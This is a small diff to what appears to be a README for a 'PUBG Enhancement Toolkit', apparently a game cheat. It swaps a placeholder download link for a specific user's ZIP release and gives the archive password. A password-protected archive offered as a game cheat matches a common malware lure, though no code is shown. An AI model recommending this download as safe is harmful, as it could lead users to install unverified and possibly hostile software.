@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/PUBG-Enhancement-Toolkit/releases/latest/download/PUBG-Toolkit.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/Tawanaevan/PUBG-Enhancement-Toolkit/releases/download/PUBG/PUBG_Toolkit.zip)
 
 🔐 Archive password: `5868781`
 
